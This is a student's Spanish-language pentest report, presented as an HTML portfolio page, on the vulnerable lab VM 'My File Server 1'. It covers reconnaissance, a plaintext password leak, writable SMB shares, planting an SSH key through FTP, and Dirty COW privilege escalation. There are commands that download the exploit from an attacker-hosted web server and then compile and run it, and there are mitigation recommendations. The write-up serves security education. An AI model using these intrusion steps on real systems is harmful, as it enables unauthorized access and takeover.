@@ -1,0 +1,646 @@
+<!DOCTYPE HTML>
+<html>
+
+<head>
+    <title>ACTIVIDAD 09 | Pentesting de My File Server 1</title>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
+    <link rel="stylesheet" href="assets/css/main.css" />
+    <style>
+        /* ESTILO PERSONALIZADO PARA EL MENÚ TIPO BARRA NEGRA */
+        #nav {
+            background-color: #000000 !important;
+            color: #ffffff !important;
+            padding: 0.5em 0;
+        }
+
+        #nav ul li a {
+            color: #ffffff !important;
+            font-weight: bold;
+            border-radius: 4px;
+        }
+
+        #nav ul li a:hover {
+            background-color: #333333;
+        }
+
+        /* Dropdown CSS Custom */
+        .dropdown-hover {
+            display: inline-block;
+            position: relative;
+        }
+
+        .dropdown-content {
+            display: none;
+            position: absolute;
+            background-color: #000000;
+            min-width: 170px;
+            z-index: 1000;
+            top: 100%;
+            left: 0;
+            padding: 0;
+            margin: 0;
+            list-style: none;
+            border-radius: 4px;
+        }
+
+        .dropdown-content li {
+            display: block;
+        }
+
+        .dropdown-content li a {
+            color: #ffffff !important;
+            padding: 10px 15px !important;
+            text-decoration: none;
+            display: block;
+            font-size: 0.9em;
+        }
+
+        .dropdown-content li a:hover {
+            background-color: #333333 !important;
+        }
+
+        .dropdown-hover:hover .dropdown-content {
+            display: block;
+        }
+
+        hr {
+            border-top: solid 1px #ccc !important;
+            opacity: 1;
+            margin: 2em 0;
+        }
+
+        .content-article {
+            background: #ffffff;
+            padding: 3em;
+            border-radius: 8px;
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.05);
+            overflow-x: auto;
+            color: #333333;
+        }
+
+        .content-article h2 {
+            color: #e63946;
+            border-bottom: 2px solid #eee;
+            padding-bottom: 0.5em;
+            margin-bottom: 1em;
+        }
+
+        .content-article h3 {
+            color: #1d3557;
+            margin-top: 1.8em;
+            font-size: 1.4em;
+            border-left: 4px solid #e63946;
+            padding-left: 10px;
+        }
+
+        .content-article h4 {
+            color: #2c3e50;
+            font-size: 1.15em;
+            margin-top: 1.2em;
+            font-weight: bold;
+        }
+
+        .pdf-btn {
+            background-color: #d32f2f;
+            color: white !important;
+            padding: 12px 24px;
+            text-decoration: none;
+            border-radius: 5px;
+            display: inline-block;
+            margin-top: 2em;
+            font-weight: bold;
+            transition: background-color 0.2s, transform 0.2s;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+        }
+
+        .pdf-btn:hover {
+            background-color: #b71c1c;
+            transform: translateY(-2px);
+        }
+
+        /* Portada interna style */
+        .cover-info {
+            text-align: center;
+            margin-bottom: 3em;
+            padding: 2.5em;
+            background: #f8f9fa;
+            border-radius: 8px;
+            border: 1px solid #e9ecef;
+        }
+
+        .cover-info h1 {
+            font-size: 2em;
+            color: #1d3557;
+            margin-bottom: 0.5em;
+            font-weight: bold;
+        }
+
+        .cover-info h2 {
+            font-size: 1.3em;
+            color: #457b9d;
+            border-bottom: none;
+            margin-bottom: 0.5em;
+        }
+
+        .cover-info p {
+            margin: 0.3em 0;
+            color: #4a4a4a;
+            font-size: 1.05em;
+        }
+
+        /* Visual Timeline */
+        .attack-timeline {
+            position: relative;
+            max-width: 800px;
+            margin: 2.5em auto;
+            padding: 0;
+            list-style: none;
+        }
+
+        .attack-timeline::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            bottom: 0;
+            width: 4px;
+            background: #e2e8f0;
+            left: 30px;
+        }
+
+        .timeline-item {
+            position: relative;
+            margin-bottom: 2.5em;
+            padding-left: 60px;
+        }
+
+        .timeline-item:last-child {
+            margin-bottom: 0;
+        }
+
+        .timeline-badge {
+            width: 40px;
+            height: 40px;
+            position: absolute;
+            background: #1d3557;
+            border: 4px solid #ffffff;
+            border-radius: 50%;
+            left: 12px;
+            top: 0;
+            z-index: 10;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #ffffff;
+            font-size: 0.85em;
+            font-weight: bold;
+            box-shadow: 0 0 0 3px #cbd5e1;
+        }
+
+        .timeline-item.root-escalation .timeline-badge {
+            background: #e63946;
+            box-shadow: 0 0 0 3px #fecaca;
+        }
+
+        .timeline-panel {
+            background: #f8fafc;
+            border: 1px solid #e2e8f0;
+            border-radius: 6px;
+            padding: 1.5em;
+            position: relative;
+            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.02);
+            transition: all 0.2s ease;
+        }
+
+        .timeline-panel:hover {
+            background: #ffffff;
+            box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.05);
+            border-color: #cbd5e1;
+        }
+
+        .timeline-panel h4 {
+            margin-top: 0;
+            margin-bottom: 0.5em;
+            color: #1d3557;
+            font-size: 1.1em;
+        }
+
+        .timeline-item.root-escalation .timeline-panel h4 {
+            color: #e63946;
+        }
+
+        .timeline-panel p {
+            font-size: 0.9em;
+            color: #475569;
+            line-height: 1.4;
+            margin: 0;
+        }
+
+        .terminal-block {
+            background: #0f172a;
+            color: #38bdf8;
+            font-family: 'Consolas', 'Monaco', monospace;
+            font-size: 0.8em;
+            padding: 10px 15px;
+            border-radius: 4px;
+            margin-top: 0.8em;
+            border-left: 3px solid #0ea5e9;
+            white-space: pre-wrap;
+            word-break: break-all;
+        }
+
+        /* CIA Triad Boxes */
+        .cia-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 1.5em;
+            margin: 2em 0;
+        }
+
+        @media screen and (max-width: 980px) {
+            .cia-grid {
+                grid-template-columns: 1fr;
+            }
+        }
+
+        .cia-box {
+            background: #f8fafc;
+            border: 1px solid #cbd5e1;
+            border-radius: 8px;
+            padding: 1.8em;
+            border-top: 5px solid #cbd5e1;
+            text-align: center;
+        }
+
+        .cia-box.confidentiality {
+            border-top-color: #e63946;
+        }
+
+        .cia-box.integrity {
+            border-top-color: #f59e0b;
+        }
+
+        .cia-box.availability {
+            border-top-color: #3b82f6;
+        }
+
+        .cia-box h4 {
+            font-size: 1.2em;
+            margin-top: 0;
+            margin-bottom: 0.8em;
+            color: #1e293b;
+        }
+
+        .cia-box .badge-cia {
+            font-size: 0.75em;
+            font-weight: bold;
+            padding: 3px 10px;
+            border-radius: 12px;
+            text-transform: uppercase;
+            letter-spacing: 0.05em;
+            display: inline-block;
+            margin-bottom: 1em;
+        }
+
+        .badge-cia.critical {
+            background: #fee2e2;
+            color: #991b1b;
+        }
+
+        .cia-box p {
+            font-size: 0.88em;
+            color: #475569;
+            line-height: 1.4;
+            margin: 0;
+            text-align: left;
+        }
+
+        /* Table styles */
+        table.pentest-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 1.5em 0;
+            font-size: 0.95em;
+        }
+
+        table.pentest-table th {
+            background: #1d3557;
+            color: #ffffff;
+            padding: 12px;
+            text-align: left;
+            font-weight: bold;
+        }
+
+        table.pentest-table td {
+            padding: 12px;
+            border-bottom: 1px solid #cbd5e1;
+            vertical-align: top;
+        }
+
+        table.pentest-table tr:nth-child(even) {
+            background: #f8fafc;
+        }
+
+        .badge-severity {
+            font-size: 0.75em;
+            font-weight: bold;
+            padding: 3px 8px;
+            border-radius: 4px;
+            text-transform: uppercase;
+            display: inline-block;
+        }
+
+        .badge-severity.critical {
+            background: #fee2e2;
+            color: #991b1b;
+        }
+
+        .badge-severity.high {
+            background: #ffedd5;
+            color: #c2410c;
+        }
+
+        .badge-severity.medium {
+            background: #fef3c7;
+            color: #b45309;
+        }
+
+        @media print {
+            #nav, .pdf-btn, p style*="text-align: left", footer, .attack-timeline::before {
+                display: none !important;
+            }
+            body {
+                background: white;
+                color: black;
+            }
+            .content-article {
+                box-shadow: none;
+                padding: 0;
+            }
+        }
+    </style>
+</head>
+
+<body class="is-preload">
+
+    <nav id="nav">
+        <ul class="container">
+            <li><a href="index.html">Inicio</a></li>
+            <li><a href="PF02.html">PF02</a></li>
+            <li><a href="PF03.html">PF03</a></li>
+            <li><a href="Final.html">Final</a></li>
+            <li><a href="actividades.html">Actividades</a></li>
+            <li><a href="proyectos.html">Proyectos</a></li>
+            <li><a href="certificaciones.html">Certificaciones</a></li>
+            <li class="dropdown-hover">
+                <a href="halloffame.html">Hall of Fame</a>
+                <ul class="dropdown-content">
+                    <li><a href="sqlinjection.html">SQL Injection</a></li>
+                </ul>
+            </li>
+        </ul>
+    </nav>
+
+    <article id="top" class="wrapper style1">
+        <div class="container">
+            <header>
+                <p style="text-align: left;"><a href="PF02.html">← Volver a PF02</a></p>
+                <h2>ACTIVIDAD 09: PENTESTING DE MY FILE SERVER 1</h2>
+                <p>Auditoría de seguridad ofensiva de caja negra (black-box) y escalada local de privilegios hasta superusuario (root).</p>
+            </header>
+
+            <div class="row">
+                <div class="col-12">
+                    <div class="content-article">
+
+                        <!-- Portada Académica -->
+                        <div class="cover-info">
+                            <h2>ACTIVIDAD 09</h2>
+                            <h1>INFORME TÉCNICO DE RED TEAM: PENTESTING DE MY FILE SERVER 1</h1>
+                            <p><strong>Alumno:</strong> Alonso Castillo Omar Karim (179033)</p>
+                            <br>
+                            <p><strong>Materia:</strong> CNO V – Seguridad Informática</p>
+                            <p><strong>Profesor:</strong> Mtro. Servando López Contreras</p>
+                            <br>
+                            <p>Universidad Politécnica de San Luis Potosí</p>
+                        </div>
+
+                        <hr />
+
+                        <!-- Resumen Ejecutivo -->
+                        <h3>1. Resumen Ejecutivo (Executive Summary)</h3>
+                        <p>El presente informe documenta la auditoría de seguridad ofensiva controlada realizada sobre el servidor virtual vulnerable **My File Server: 1**. El objetivo primordial de la evaluación consistió en simular un ataque cibernético realista bajo una metodología de **caja negra (black-box)** para identificar brechas críticas que pongan en riesgo la infraestructura empresarial.</p>
+                        
+                        <p>Durante la auditoría se identificaron vulnerabilidades severas que, combinadas secuencialmente, permitieron comprometer la totalidad del sistema:</p>
+                        <ul>
+                            <li><strong>1. Fuga de credenciales en texto plano:</strong> Presencia de una contraseña administrativa expuesta de manera pública en el archivo `/readme.txt` de la raíz del servidor web Apache.</li>
+                            <li><strong>2. Recurso SMB inseguro:</strong> El recurso compartido `smbdata` del servicio Samba se encontraba expuesto y configurado de forma permisiva con privilegios completos de lectura y escritura.</li>
+                            <li><strong>3. Escalada de privilegios a Root:</strong> Un kernel de Linux desactualizado y vulnerable a la falla **Dirty COW (CVE-2016-5195)** permitió elevar los privilegios de un usuario común (`smbuser`) a superusuario (`root`) de forma local e instantánea.</li>
+                        </ul>
+                        <p>El nivel de riesgo asociado a esta máquina virtual es calificado técnicamente como <strong>Crítico (Alto)</strong>. Un atacante con acceso a la red podría exfiltrar datos corporativos confidenciales, inyectar archivos maliciosos en la red y tomar control absoluto del servidor afectado.</p>
+
+                        <hr />
+
+                        <!-- Alcance y Metodología -->
+                        <h3>2. Alcance (Scope) y Metodología</h3>
+                        <p>El alcance autorizado comprendió de forma exclusiva la evaluación técnica sobre el host local con la dirección IP **192.168.56.103** en un entorno de red segmentado (*Host-Only*). Se prohibió expresamente realizar ataques destructivos que causaran Denegación de Servicio (DoS).</p>
+                        
+                        <p>Se implementó un enfoque metodológico estricto basado en las directrices del **PTES (Penetration Testing Execution Standard)** y el marco de pruebas web de **OWASP**, dividiéndose en 6 fases:</p>
+                        <ol>
+                            <li>Reconocimiento Pasivo y Activo de red.</li>
+                            <li>Enumeración detallada de servicios y versiones activas.</li>
+                            <li>Análisis y detección sistemática de vulnerabilidades.</li>
+                            <li>Explotación controlada para obtener acceso inicial.</li>
+                            <li>Post-explotación y escalamiento de privilegios locales.</li>
+                            <li>Análisis de impacto y generación de propuestas de mitigación.</li>
+                        </ol>
+
+                        <hr />
+
+                        <!-- Línea de Tiempo del Ataque -->
+                        <h3>3. Línea de Tiempo de la Intrusión (Attack Path)</h3>
+                        <p>A continuación se representa de forma visual la línea temporal de las fases de reconocimiento, explotación y escalada ejecutadas por el analista durante el pentesting:</p>
+
+                        <ul class="attack-timeline">
+                            
+                            <li class="timeline-item">
+                                <div class="timeline-badge">01</div>
+                                <div class="timeline-panel">
+                                    <h4>Reconocimiento Pasivo (Mapeo de Capa 2)</h4>
+                                    <p>Descubrimiento dinámico de hosts activos en el segmento local mediante solicitudes ARP utilizando `netdiscover`, aislando con éxito la dirección IP de la víctima:</p>
+                                    <div class="terminal-block">sudo netdiscover -r 192.168.56.0/24
+==> Target VM IP Identified: 192.168.56.103</div>
+                                </div>
+                            </li>
+
+                            <li class="timeline-item">
+                                <div class="timeline-badge">02</div>
+                                <div class="timeline-panel">
+                                    <h4>Escaneo Activo de Puertos e Identificación de Servicios</h4>
+                                    <p>Se lanzó un escaneo de puertos y servicios completo con `nmap` para revelar qué vectores de entrada TCP se encontraban disponibles en la IP identificada:</p>
+                                    <div class="terminal-block">nmap -p- -sV 192.168.56.103
+==> Open Ports: 21/tcp (FTP), 22/tcp (SSH), 80/tcp (HTTP), 139/445/tcp (SMB)</div>
+                                </div>
+                            </li>
+
+                            <li class="timeline-item">
+                                <div class="timeline-badge">03</div>
+                                <div class="timeline-panel">
+                                    <h4>Enumeración Web y Fuga de Información Crítica</h4>
+                                    <p>Se utilizó el escáner de directorios web `nikto` sobre el puerto 80. La herramienta expuso la existencia del archivo `/readme.txt`, que contenía credenciales legibles:</p>
+                                    <div class="terminal-block">nikto -h http://192.168.56.103
+==> Directory Found: http://192.168.56.103/readme.txt
+==> Plaintext string: "My password is rootroot1" (for smbuser)</div>
+                                </div>
+                            </li>
+
+                            <li class="timeline-item">
+                                <div class="timeline-badge">04</div>
+                                <div class="timeline-panel">
+                                    <h4>Enumeración de Recursos Compartidos SMB</h4>
+                                    <p>Utilizando `smbmap` con las credenciales fugadas, se analizó el servidor Samba. Se constató que el recurso `smbdata` poseía permisos de lectura y escritura directos (R/W):</p>
+                                    <div class="terminal-block">sudo smbmap -u smbuser -p rootroot1 -H 192.168.56.103
+==> Share: "smbdata" - Permissions: READ / WRITE</div>
+                                </div>
+                            </li>
+
+                            <li class="timeline-item">
+                                <div class="timeline-badge">05</div>
+                                <div class="timeline-panel">
+                                    <h4>Explotación y Establecimiento de Acceso Inicial</h4>
+                                    <p>Para asegurar un acceso remoto e indetectable por SSH sin alertas de login, se generó un par de llaves criptográficas SSH. Usando FTP, se accedió al servidor de archivos y se cargó la clave pública local en la carpeta `.ssh` remota como clave autorizada:</p>
+                                    <div class="terminal-block">sudo ssh-keygen -t ed25519
+ftp 192.168.56.103 (smbuser / rootroot1)
+ftp> mkdir .ssh
+ftp> cd .ssh
+ftp> put id_ed25519.pub authorized_keys
+ssh smbuser@192.168.56.103 ==> Shell inicial establecida con éxito.</div>
+                                </div>
+                            </li>
+
+                            <li class="timeline-item root-escalation">
+                                <div class="timeline-badge"><i class="icon solid fa-skull"></i></div>
+                                <div class="timeline-panel">
+                                    <h4>Post-Explotación: Escalada de Privilegios (Dirty COW)</h4>
+                                    <p>Una vez dentro por SSH, se detectó un Kernel de Linux vulnerable a la condición de carrera **Dirty COW (CVE-2016-5195)**. Se descargó el exploit `dirtyCow.c` levantando un servidor web local en Python en la máquina atacante, se compiló en la víctima usando `gcc` y se ejecutó para reescribir archivos raíz y convertirse en root:</p>
+                                    <div class="terminal-block"># Atacante
+python3 -m http.server 8080
+
+# Víctima (SSH)
+wget http://192.168.56.102:8080/dirtyCow.c
+gcc dirtyCow.c -o Aznar -pthread
+./Aznar
+whoami ==> root (¡Acceso de superusuario total establecido!)</div>
+                                </div>
+                            </li>
+
+                        </ul>
+
+                        <hr />
+
+                        <!-- Análisis de Impacto -->
+                        <h3>4. Análisis de Impacto (Modelo CIA)</h3>
+                        <p>El compromiso total de la máquina virtual representa un impacto severo estructurado en las tres dimensiones CIA:</p>
+                        
+                        <div class="cia-grid">
+                            <div class="cia-box confidentiality">
+                                <h4>Confidencialidad</h4>
+                                <span class="badge-cia critical">Crítico</span>
+                                <p>El acceso a nivel root otorga visibilidad completa sobre todo el sistema de archivos del servidor. Credenciales de bases de datos, claves de cifrado y documentos confidenciales de la corporación alojados en los directorios de usuario son totalmente expuestos a exfiltración y espionaje.</p>
+                            </div>
+                            <div class="cia-box integrity">
+                                <h4>Integridad</h4>
+                                <span class="badge-cia critical">Crítico</span>
+                                <p>Un atacante que escala privilegios a root tiene control absoluto de modificación. Puede alterar los logs de auditoría del sistema de manera destructiva para no dejar rastro, inyectar troyanos o scripts maliciosos de persistencia en la web legítima o alterar datos de bases de datos.</p>
+                            </div>
+                            <div class="cia-box availability">
+                                <h4>Disponibilidad</h4>
+                                <span class="badge-cia critical">Crítico</span>
+                                <p>Al controlar el kernel del servidor virtual, el atacante puede realizar un apagado destructivo del sistema de archivos, deshabilitar puertos de red locales o desplegar ransomware corporativo para encriptar la máquina y secuestrar las operaciones comerciales del negocio.</p>
+                            </div>
+                        </div>
+
+                        <hr />
+
+                        <!-- Inventario de Hallazgos -->
+                        <h3>5. Tabla de Vulnerabilidades e Inventario de Hallazgos</h3>
+                        <p>A continuación se detallan de forma estructurada los hallazgos críticos detectados, con sus respectivos niveles de severidad y las propuestas técnicas de mitigación inmediata:</p>
+
+                        <table class="pentest-table">
+                            <thead>
+                                <tr>
+                                    <th>ID</th>
+                                    <th>Vulnerabilidad</th>
+                                    <th>Severidad</th>
+                                    <th>Evidencia de Campo</th>
+                                    <th>Recomendación y Mitigación</th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                <tr>
+                                    <td><strong>VULN-01</strong></td>
+                                    <td>Almacenamiento de credenciales en texto plano en archivo público web</td>
+                                    <td><span class="badge-severity high">Alta</span></td>
+                                    <td>Archivo visible en el puerto 80 bajo la URL `http://192.168.56.103/readme.txt` que expone directamente la contraseña.</td>
+                                    <td>Eliminar de inmediato archivos con contraseñas en texto plano de directorios públicos. Implementar políticas de robustez y rotación periódica.</td>
+                                </tr>
+                                <tr>
+                                    <td><strong>VULN-02</strong></td>
+                                    <td>Permisos excesivos de escritura (R/W) en recurso compartido SMB público</td>
+                                    <td><span class="badge-severity medium">Media</span></td>
+                                    <td>Mapeo de Samba mediante `smbmap` exponiendo el recurso `smbdata` con permisos completos de escritura.</td>
+                                    <td>Aplicar listas de control de acceso (ACLs) y el principio de mínimo privilegio. Configurar la share en modo *Read-Only* salvo justificación estricta.</td>
+                                </tr>
+                                <tr>
+                                    <td><strong>VULN-03</strong></td>
+                                    <td>Kernel desactualizado propenso a escalada local de privilegios (Dirty COW)</td>
+                                    <td><span class="badge-severity critical">Crítica</span></td>
+                                    <td>Explotación exitosa local inyectando y ejecutando el binario compilado `Aznar` (CVE-2016-5195) obteniendo root.</td>
+                                    <td>Actualizar el Kernel del sistema operativo Linux de forma inmediata con los últimos parches de seguridad provistos por el fabricante.</td>
+                                </tr>
+                            </tbody>
+                        </table>
+
+                        <hr />
+
+                        <!-- Conclusión -->
+                        <h3>6. Conclusión y Recomendaciones Organizacionales</h3>
+                        <p>El pentesting de **My File Server 1** ha evidenciado que el riesgo en ciberseguridad no suele nacer de una única falla catastrófica, sino del **encadenamiento de brechas lógicas menores** (fuga de contraseña en texto plano, permisos dinámicos débiles en SMB y parches de sistema pendientes en el kernel). La combinación de estas tres fallas permitió a un atacante externo e inicial sin privilegios convertirse en el administrador definitivo (root) de la infraestructura.</p>
+                        
+                        <p>Se recomienda con carácter urgente programar una ventana de mantenimiento para aplicar parches de kernel a la máquina virtual, restringir accesos en red mediante reglas de cortafuegos restrictivas y habilitar auditorías de código internas para impedir la publicación de claves en texto plano en servidores de cara al público.</p>
+
+                        <!-- PDF Download Section -->
+                        <div style="text-align: center; margin-top: 3.5em; border-top: 1px solid #eee; padding-top: 2em;">
+                            <p style="font-size: 0.95em; color: #666;">¿Deseas consultar el reporte técnico de Red Team original y completo en formato PDF?</p>
+                            <a href="Actividades/act9.pdf" class="pdf-btn" download>
+                                <i class="icon solid fa-file-pdf" style="margin-right: 8px;"></i> Descargar PDF Original (act9.pdf)
+                            </a>
+                        </div>
+
+                    </div>
+                </div>
+            </div>
+        </div>
+    </article>
+
+    <article class="wrapper style4">
+        <div class="container medium">
+            <footer>
+                <ul id="copyright">
+                    <li>&copy; Alonso Castillo Omar Karim. Todos los derechos reservados.</li>
+                    <li>Diseño base: <a href="http://html5up.net">HTML5 UP</a></li>
+                </ul>
+            </footer>
+        </div>
+    </article>
+
+    <script src="assets/js/jquery.min.js"></script>
+    <script src="assets/js/jquery.scrolly.min.js"></script>
+    <script src="assets/js/browser.min.js"></script>
+    <script src="assets/js/breakpoints.min.js"></script>
+    <script src="assets/js/util.js"></script>
+    <script src="assets/js/main.js"></script>
+
+</body>
+
+</html>
